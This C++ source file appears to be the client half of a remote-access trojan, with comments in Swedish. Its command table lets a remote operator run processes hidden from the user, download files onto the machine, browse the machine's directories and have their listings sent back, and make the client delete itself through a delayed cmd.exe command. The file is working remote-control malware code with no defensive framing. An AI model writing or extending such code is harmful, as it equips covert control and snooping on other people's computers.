#pragma once
#include "precompile.h"
#include "client.h"
#include "payloads.h"

response_table client::get_responses()
{
	return {
		{"time", [&](std::string data) {return std::to_string(time(0)); }},
		{"alive", [&](std::string data) {return "true"; }},
		{"process-v", payload::process_execution_show},
		{"process-h", payload::process_execution_hidden},
		{"download", payload::download_file}
	};
}

action_table client::get_actions()
{
	return {
		{"exit", [&](std::string data) { exit(0); }},
		{"uninstall", [&](std::string) {
			payload::process_execution(R"("C:\Windows\System32\cmd.exe" /K timeout /t 2 && del )" + std::filesystem::current_path().string() + "\\client.exe", true); exit(0);
		}},
		{"select", [&](std::string data) {
			directory manager(data); //antag data är bas directory
			helper::send_directory(client_implentation, manager.current_directory()); // skicka bas mappen

			packet paket = client_implentation.receive_packet();
			while (paket.id != "dir_action" && paket.data != "done") {
				std::cout << "recv()[" << paket.id << "|" << paket.data << "]" << std::endl;
				if (!paket.id.empty() && !paket.data.empty()) { // paketet inte är tomt
					if (paket.id == "goto" && std::all_of(paket.data.begin(), paket.data.end(), isdigit)) { // om vi ska gå in i en undermapp
						helper::send_directory(client_implentation, manager.descend(std::stoi(paket.data))); // gå in och skicka undermappen
					}
				}
				paket = client_implentation.receive_packet();
			}
		}}
	};
}